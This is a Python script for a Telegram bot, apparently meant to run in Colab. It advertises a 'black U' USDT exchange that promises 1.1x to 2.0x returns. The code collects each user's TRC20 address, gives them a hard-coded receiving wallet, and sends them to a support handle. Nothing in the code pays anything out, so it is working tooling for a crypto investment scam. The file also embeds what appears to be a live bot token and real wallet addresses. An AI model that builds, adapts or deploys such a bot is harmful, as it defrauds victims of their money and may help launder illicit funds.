# ========== 黑U兑换机器人 - Colab版 ==========
# 第一步：安装依赖

# ========== 第二步：完整代码 ==========
import asyncio
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread
import nest_asyncio

# 配置
BOT_TOKEN = '8424641311:AAG2fAmUNMt02yD8BAaQTuK4VleAmlMw9KQ'
RECEIVE_ADDRESS = 'TV7bNa8iJDwUhS2MQL9EpfnVWiVHiMCe1e'

# 日志
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 存储用户会话
user_sessions = {}

# ========== 键盘定义 ==========
def get_main_keyboard():
    """6个主按钮"""
    keyboard = [
        [InlineKeyboardButton("🧪 创建测试单", callback_data='order_test')],
        [InlineKeyboardButton("📊 创建1.1倍订单", callback_data='order_1.1x')],
        [InlineKeyboardButton("📈 创建1.5倍订单", callback_data='order_1.5x')],
        [InlineKeyboardButton("⭐️ 创建2.0倍高级订单", callback_data='order_2.0x')],
        [InlineKeyboardButton("📋 备份我的订单", callback_data='backup')],
        [InlineKeyboardButton("🤝 代理通道", callback_data='agent')],
        [InlineKeyboardButton("👨‍💻 客服中心", callback_data='support')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ 取消", callback_data='cancel')]]
    return InlineKeyboardMarkup(keyboard)

def get_confirm_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ 确认订单", callback_data='confirm')],
        [InlineKeyboardButton("❌ 取消", callback_data='cancel')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton("◀️ 返回主菜单", callback_data='back')]]
    return InlineKeyboardMarkup(keyboard)

# ========== 简洁版欢迎消息 ==========
WELCOME_MESSAGE = """✅ 您好 {name}，欢迎使用自助黑U兑换机器人

公群繁忙时，您也可以在这里自助下单，系统自动结算

❤️‍🔥 500u以上订单随机赠送本金的3%~15%

【兑换费率】
• 测试单：10u起，1.1倍
• 100-499u：1.1倍，利润10%
• 500-999u：1.5倍，利润50%+
• 1000-2999u：1.7倍，利润70%+
• 3000-9999u：1.8倍，利润80%+
• 10000-100000u：2.0倍，利润100%+

【测试单说明】
10u起（仅一单），1:1.1兑换
例：10u→11u、30u→33u、50u→55u
目的：证明u可正常交易，非假U

【黑U钱包地址】
地址1：TGT4w2vG7Ck9Ho8cxxbHj1UsURbLGCVXeq
地址2：TMDFPVbapQamkPVXLFDccyzRVxVpo5NN4S
⚠️ 此地址只出款，切勿转账，转入不退

点击下方按钮创建订单，转账后10分钟内自动回款"""

# ========== 命令处理 ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理/start命令"""
    chat_id = update.effective_chat.id
    user_name = update.effective_user.first_name

    # 个性化欢迎消息
    personalized_welcome = WELCOME_MESSAGE.replace("{name}", user_name)

    await update.message.reply_text(
        personalized_welcome,
        reply_markup=get_main_keyboard()
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理按钮回调"""
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    data = query.data

    # 初始化会话
    if user_id not in user_sessions:
        user_sessions[user_id] = {}

    # 创建订单按钮
    if data == 'order_test':
        user_sessions[user_id] = {
            'order_type': 'test',
            'awaiting_address': True
        }
        await query.edit_message_text(
            "🧪 创建测试单\n\n"
            "测试单10u起，1.1倍兑换\n"
            "例：10u→11u\n\n"
            "📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )

    elif data == 'order_1.1x':
        user_sessions[user_id] = {
            'order_type': '1.1x',
            'awaiting_address': True
        }
        await query.edit_message_text(
            "📊 创建1.1倍订单\n\n"
            "100-499u，1.1倍兑换\n"
            "利润10%\n\n"
            "📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )

    elif data == 'order_1.5x':
        user_sessions[user_id] = {
            'order_type': '1.5x',
            'awaiting_address': True
        }
        await query.edit_message_text(
            "📈 创建1.5倍订单\n\n"
            "500-999u，1.5倍兑换\n"
            "利润50%+\n"
            "赠送3%-15%\n\n"
            "📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )

    elif data == 'order_2.0x':
        user_sessions[user_id] = {
            'order_type': '2.0x',
            'awaiting_address': True
        }
        await query.edit_message_text(
            "⭐️ 创建2.0倍高级订单\n\n"
            "1000-9999u，2.0倍兑换\n"
            "利润100%+\n"
            "赠送3%-15%\n\n"
            "📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )

    # 其他功能
    elif data == 'backup':
        await query.edit_message_text(
            "📋 备份订单\n\n功能开发中，请联系客服",
            reply_markup=get_back_keyboard()
        )

    elif data == 'agent':
        await query.edit_message_text(
            "🤝 代理通道\n\n联系客服开通代理权限：@she3125",
            reply_markup=get_back_keyboard()
        )

    elif data == 'support':
        await query.edit_message_text(
            "👨‍💻 客服中心\n\n"
            "客服：@she3125\n"
            "在线时间：24/7",
            reply_markup=get_back_keyboard()
        )

    # 确认订单
    elif data == 'confirm':
        if user_id in user_sessions and 'user_address' in user_sessions[user_id]:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            order_types = {
                'test': '🧪 测试单 1.1倍',
                '1.1x': '📊 1.1倍订单',
                '1.5x': '📈 1.5倍订单',
                '2.0x': '⭐️ 2.0倍订单'
            }
            order_type_text = order_types.get(user_sessions[user_id]['order_type'], '未知')

            order_text = (
                "✅ 订单创建成功！\n\n"
                f"类型：{order_type_text}\n"
                f"时间：{now}\n"
                "时效：10分钟内有效\n\n"
                "💳 请转账到\n"
                f"{RECEIVE_ADDRESS}\n\n"
                "📤 您的收款地址\n"
                f"{user_sessions[user_id]['user_address']}\n\n"
                "✅ 转账后联系客服 @she3125"
            )

            await query.edit_message_text(
                order_text,
                reply_markup=get_back_keyboard()
            )
            del user_sessions[user_id]

    # 取消/返回
    elif data == 'cancel':
        if user_id in user_sessions:
            del user_sessions[user_id]
        user_name = update.effective_user.first_name
        personalized_welcome = WELCOME_MESSAGE.replace("{name}", user_name)
        await query.edit_message_text(
            personalized_welcome,
            reply_markup=get_main_keyboard()
        )

    elif data == 'back':
        if user_id in user_sessions:
            del user_sessions[user_id]
        user_name = update.effective_user.first_name
        personalized_welcome = WELCOME_MESSAGE.replace("{name}", user_name)
        await query.edit_message_text(
            personalized_welcome,
            reply_markup=get_main_keyboard()
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理普通消息（地址输入）"""
    user_id = update.effective_user.id
    text = update.message.text

    if user_id in user_sessions and user_sessions[user_id].get('awaiting_address'):
        # 验证地址
        if not text.startswith('T') or len(text) != 34:
            await update.message.reply_text(
                "❌ 地址格式错误\n\n"
                "正确格式：以T开头的34位字符\n"
                "例如：TV7bNa8iJDwUhS2MQL9EpfnVWiVHiMCe1e",
                reply_markup=get_cancel_keyboard()
            )
            return

        # 保存地址
        user_sessions[user_id]['user_address'] = text
        user_sessions[user_id]['awaiting_address'] = False

        await update.message.reply_text(
            "📋 确认收款地址\n\n"
            f"{text}\n\n"
            "确认无误后点击下方按钮",
            reply_markup=get_confirm_keyboard()
        )
    else:
        await update.message.reply_text(
            "请点击下方按钮操作 👇",
            reply_markup=get_main_keyboard()
        )

# ========== 保持运行 ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

async def main():
    # 创建机器人应用
    application = Application.builder().token(BOT_TOKEN).build()

    # 添加处理器
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # 启动机器人
    print("🤖 机器人启动中...")
    print("客服已设置为：@she3125")
    await application.run_polling()

# ========== 第三步：运行 ==========
if __name__ == '__main__':
    nest_asyncio.apply()

    # 启动Flask线程
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

    # 启动机器人
    asyncio.run(main())
